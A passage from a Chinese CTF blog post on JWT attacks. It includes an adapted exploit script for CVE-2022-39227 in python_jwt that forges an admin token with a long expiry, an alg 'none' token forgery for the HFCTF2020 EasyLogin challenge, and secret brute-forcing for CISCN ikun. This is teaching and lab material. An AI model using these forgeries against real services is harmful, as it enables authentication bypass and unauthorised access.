&quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">Verify</span>(Vows.Context):<br>            <span class="hljs-string">&quot;&quot;&quot; Check the forged token fails to verify &quot;&quot;&quot;</span><br><span class="hljs-meta">            @Vows.capture_error</span><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">self, topic</span>):<br>                <span class="hljs-string">&quot;&quot;&quot; Verify the forged token &quot;&quot;&quot;</span><br>                <span class="hljs-keyword">return</span> jwt.verify_jwt(topic, generated_keys[<span class="hljs-string">&#x27;PS256&#x27;</span>], [<span class="hljs-string">&#x27;PS256&#x27;</span>])<br><br>            <span class="hljs-keyword">def</span> <span class="hljs-title function_">token_should_not_verify</span>(<span class="hljs-params">self, r</span>):<br>                <span class="hljs-string">&quot;&quot;&quot; Check the token doesn&#x27;t verify due to mixed format being detected &quot;&quot;&quot;</span><br>                expect(r).to_be_an_error()<br>                expect(<span class="hljs-built_in">str</span>(r)).to_equal(<span class="hljs-string">&#x27;invalid JWT format&#x27;</span>)<br></code></pre></td></tr></table></figure><p>注意这一点注释：<code>&quot;Use mix of JSON and compact format to insert forged claims including long expiration&quot;</code>可以得知，这个漏洞的本质就是利用 json格式的注⼊  </p><p>如果稍加改造，我们就可以获得一个EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> timedelta<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> loads, dumps<br><span class="hljs-keyword">from</span> common <span class="hljs-keyword">import</span> generated_keys<br><span class="hljs-keyword">import</span> python_jwt <span class="hljs-keyword">as</span> jwt<br><span class="hljs-keyword">from</span> pyvows <span class="hljs-keyword">import</span> Vows, expect<br><span class="hljs-keyword">from</span> jwcrypto.common <span class="hljs-keyword">import</span> base64url_decode, base64url_encode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">topic</span>(<span class="hljs-params">topic</span>):<br>    <span class="hljs-string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span><br>    [header, payload, signature] = topic.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    parsed_payload = loads(base64url_decode(payload))<br>    parsed_payload[<span class="hljs-string">&#x27;is_admin&#x27;</span>] = <span class="hljs-number">1</span><br>    parsed_payload[<span class="hljs-string">&#x27;exp&#x27;</span>] = <span class="hljs-number">2000000000</span><br>    fake_payload = base64url_encode(<br>        (dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br>    <span class="hljs-comment"># print (header+ &#x27;.&#x27; +fake_payload+ &#x27;.&#x27; +signature)</span><br>    <span class="hljs-comment"># print (header+ &#x27;.&#x27; + payload+ &#x27;.&#x27; +signature)</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#123;&quot;  &#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fake_payload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span><br><br>originaltoken = <span class="hljs-string">&#x27;&#x27;&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NjcxNDE5MTUsImlhdCI6MTY2NzE0MTYxNSwiaXNfYWRtaW4iOjAsImlzX2xvZ2luIjoxLCJqdGkiOiI1dnBYUmNpck1semxNUG54MHNTWDd3IiwibmJmIjoxNjY3MTQxNjE1LCJwYXNzd29yZCI6ImY2MWQiLCJ1c2VybmFtZSI6ImY2MWQifQ.cqQ2RVegORBfB_fo33birEJs8Tw8WDM7wIYwfXz_BpW6gQG99cl-DePmP6iNx5Mf0aCwDcuqS-wOXjis7JVmhpf8dmdYkP_gLvYMULpPcFX03j70Cu3bhMWSAGUMjt_IFGQ1-xfwYp1LI9SWAlBM5wDPCh-gi96abRDvhRW-c-6mFul2us_XKl7kyceT2fY2ABrcJRSKA91kLm3ZOcD4FA6yuHMyKVfmN9RqPtzvvUVutniv03XPFTGIzHudzswRc0b3nN-XMsnyi_Ca62T8CVb1MMEDPVlDM7CDJmJXGfoNimkrOhPi22SItpv4tO7u-bbene3PpvW1Lv7UEQeDBg&#x27;&#x27;&#x27;</span><br><br>topic = topic(originaltoken)<br><span class="hljs-built_in">print</span>(topic)<br></code></pre></td></tr></table></figure><p>利用生成的json当作token传参即可绕过：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847065180-579c6d06-711c-4c2b-acdc-8bc854a46812.png" alt="img"></p><p>JWT的部分其实到这就结束了，后面如何拿flag就涉及到grahql的一个注入了，如果有时间，我会在下一篇文章总结一些SQL注入的知识。</p><h2 id="From-FunWeb-to-CVE-2022-39227-vulnerability-analysis"><a href="#From-FunWeb-to-CVE-2022-39227-vulnerability-analysis" class="headerlink" title="From FunWeb to CVE-2022-39227 vulnerability analysis"></a>From FunWeb to CVE-2022-39227 vulnerability analysis</h2><p>本来还想着要分析，最近时间不是很够，敲好J1an师傅直接把文档炫我嘴里了（，</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847767154-29fdc9b4-817c-4e39-9ba6-80335b838f62.png" alt="img"></p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667847750329-8f0cc9f5-9ae8-46d8-bad9-555ee2173e64.png" alt="img"></p><p>那这里原理分析我就直接使用J1an师傅的文章啦：</p><p>原文地址：<a href="https://forum.butian.net/share/1990">https://forum.butian.net/share/1990</a> 过审了所以添上了ww</p><p><a href="https://www.yuque.com/attachments/yuque/0/2022/pdf/21803058/1667847629252-562bc55d-8161-4c32-a5ff-1cad49da7960.pdf">奇安信攻防社区-CVE-2022-39227漏洞分析.pdf</a></p><h2 id="Other-Jwt-topics"><a href="#Other-Jwt-topics" class="headerlink" title="Other Jwt topics"></a>Other Jwt topics</h2><h3 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h3><p>该WriteUp来源：<a href="https://www.jianshu.com/p/0f76e1c69e33">https://www.jianshu.com/p/0f76e1c69e33</a></p><h4 id="复现环境："><a href="#复现环境：" class="headerlink" title="复现环境："></a>复现环境：</h4><p>[<a href="https://buuoj.cn/challenges#[HFCTF2020\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)">https://buuoj.cn/challenges#[HFCTF2020\]EasyLogin](https://links.jianshu.com/go?to=https%3A%2F%2Fbuuoj.cn%2Fchallenges%23%5BHFCTF2020%5DEasyLogin)</a><br><a href="https://links.jianshu.com/go?to=https://www.ctfhub.com/%23/challenge">https://www.ctfhub.com/#/challenge</a></p><h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>运行环境发现是一个登录页面，直接登录显示<code>Cannot read property &#39;split&#39; of undefined</code>，<strong>需要先注册再登陆。</strong><br>使用注册的普通账号登录，发现<code>get flag</code>按钮，点击提示<code>permission denied</code>，无权限，那么此题的方向应该是伪造成一个高权限账户。<br>截取登录包，发现两处可疑<code>authorization</code>校验字段，<code>Cookie</code>也存在<code>sses.aok</code>的校验</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667899778186-b6a9fa71-efbe-4f8d-a1b8-5d5e096f4dca.png" alt="img"></p><p>可以看到<code>xxx.yyy.zzz</code>的结构，解码可知为jwt</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667899843564-133b73ed-452e-47eb-8a29-2ad42fbaaf93.png" alt="img"></p><p>通过查看源码，发现&#x2F;static&#x2F;js&#x2F;app.js 页面存在提示</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">/**<br> *  或许该用 koa-static 来处理静态文件<br> *  路径该怎么配置？不管了先填个根目录XD<br> */<br></code></pre></td></tr></table></figure><p><strong>koa-static 错误配置的源码泄露</strong></p><p>说明 <code>app.js</code> 是直接静态映射到程序根目录的，直接访问根目录的该文件可直接看到源码</p><p>继续分析根目录的<code>app.js</code>，发现代码引用了两个当前目录的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">const rest = require(<span class="hljs-string">&#x27;./rest&#x27;</span>);<br>const controller = require(<span class="hljs-string">&#x27;./controller&#x27;</span>);<br></code></pre></td></tr></table></figure><p>说明存在rest.js和controller.js文件</p><p>访问<code>rest.js</code>发现同样一个路径前缀 api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">const pathPrefix = <span class="hljs-string">&#x27;/api/&#x27;</span>;<br></code></pre></td></tr></table></figure><p>访问<code>controller.js</code>看到下面的代码</p><p>遍历在controllers文件夹下的以.js结尾的文件，并且引入文件添加在router中，推断controllers文件夹下存在一个api.js文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">function addControllers(router, <span class="hljs-built_in">dir</span>) &#123;<br>    fs.readdirSync(__dirname + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-built_in">dir</span>).<span class="hljs-built_in">filter</span>(f =&gt; &#123;<br>        <span class="hljs-keyword">return</span> f.endsWith(<span class="hljs-string">&#x27;.js&#x27;</span>);<br>    &#125;).forEach(f =&gt; &#123;<br>        const mapping = require(__dirname + <span class="hljs-string">&#x27;/&#x27;</span> + <span class="hljs-built_in">dir</span> + <span class="hljs-string">&#x27;/&#x27;</span> + f);<br>        addMapping(router, mapping);<br>    &#125;);<br>&#125;<br><br>module.exports = (<span class="hljs-built_in">dir</span>) =&gt; &#123;<br>    const controllers_dir = <span class="hljs-built_in">dir</span> || <span class="hljs-string">&#x27;controllers&#x27;</span>;<br>    const router = require(<span class="hljs-string">&#x27;koa-router&#x27;</span>)();<br>    addControllers(router, controllers_dir);<br>    <span class="hljs-keyword">return</span> router.routes();<br>&#125;;<br></code></pre></td></tr></table></figure><p>访问<code>/controllers/api.js</code>前端几个能看到的功能接口逻辑都在了，分析登录和注册接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 注册：</span><br><br>const secret = crypto.randomBytes(<span class="hljs-number">18</span>).toString(<span class="hljs-string">&#x27;hex&#x27;</span>);<br><br>const secretid = <span class="hljs-keyword">global</span>.secrets.length;<br><br><span class="hljs-keyword">global</span>.secrets.push(secret)<br><br>const token = jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br><br><span class="hljs-comment"># 登录：</span><br><br>const token = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br><br>const sid = JSON.parse(Buffer.<span class="hljs-keyword">from</span>(token.split(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).toString()).secretid;<br><br>console.log(sid)<br><br><span class="hljs-keyword">if</span>(sid === undefined || sid === null || !(sid &lt; <span class="hljs-keyword">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;     <br>    throw new APIError(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>&#125;<br><br>const secret = <span class="hljs-keyword">global</span>.secrets[sid];<br><br>const user = jwt.verify(token, secret, &#123;algorithm: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br></code></pre></td></tr></table></figure><p>我们看到secretid值校验，要求 sid 不能为 undefined，null，并且必须在全局变量 secrets 数组的长度和 0 之间。JavaScript 是一门弱类型语言，可以通过空数组与数字比较永远为真或是小数来绕过，而这个题利用的是 将加密方式改为’none’ 的方法，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(jwt.encode(&#123;<span class="hljs-string">&quot;secretid&quot;</span>:<span class="hljs-number">0.1</span>,<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;,algorithm=<span class="hljs-string">&quot;none&quot;</span>,key=<span class="hljs-string">&quot;&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>把生成的值替换authorization的值就通过验证了</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667900973813-aeafc668-6cc6-4b9c-b463-3d30067a05db.png" alt="img"></p><p>登入之后点击get flag，权限足够，获得flag</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667900984656-9ad6c80f-1f9b-4476-b745-accfd26a5c2d.png" alt="img"></p><h3 id="CISCN-2019-华北赛区-Web-ikun"><a href="#CISCN-2019-华北赛区-Web-ikun" class="headerlink" title="CISCN 2019 华北赛区 Web - ikun"></a>CISCN 2019 华北赛区 Web - ikun</h3><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><p><a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>当然这道题还涉及逻辑漏洞和python反序列化，我们在这只提一下JWT部分，详细的WP师傅们可以在网上找到。</p><p>&#x2F;b1g_m4mber这个页面，提示只允许admin访问</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904382380-0852286f-3e43-4392-a634-d2e06fccb725.png" alt="img"></p><p>既然提示要admin，那基本上跟cookie有关，查看一下cookie，发现是JWT</p><p>解码可得：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904433899-179df22b-189f-4163-9fdf-0405bab08f04.png" alt="img"></p><p>而这道题对于jwt的解法是爆破密钥，我们用到一个叫<a href="https://github.com/brendan-rius/c-jwt-cracker">jwt-cracker</a>的工具来爆破密钥。</p><p>当然 之前提到的 JWT tool 也支持密钥爆破。</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904553790-eab830ae-f17a-4a29-9452-529e1bc6ed91.png" alt="img"></p><p>爆破出来密钥为1Kun，修改用户名为admin，修改token重放：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904579739-cdd029cb-ae8a-441e-8526-fa78c736ab21.png" alt="img"></p><p>接下来就是python反序列化了：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/1667904603214-9d2949a7-2a36-4224-b800-b6422ec42084.png" alt="img"></p><h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><ul><li>Tool:</li></ul><p><a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p><p><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><ul><li>Reference</li></ul><p><a href="https://github.com/ticarpi/jwt_tool/wiki">https://github.com/ticarpi/jwt_tool/wiki</a></p><p><a href="https://saucer-man.com/information_security/377.html">https://saucer-man.com/information_security/377.html</a></p><p><a href="https://xz.aliyun.com/t/9376#toc-0">https://xz.aliyun.com/t/9376#toc-0</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
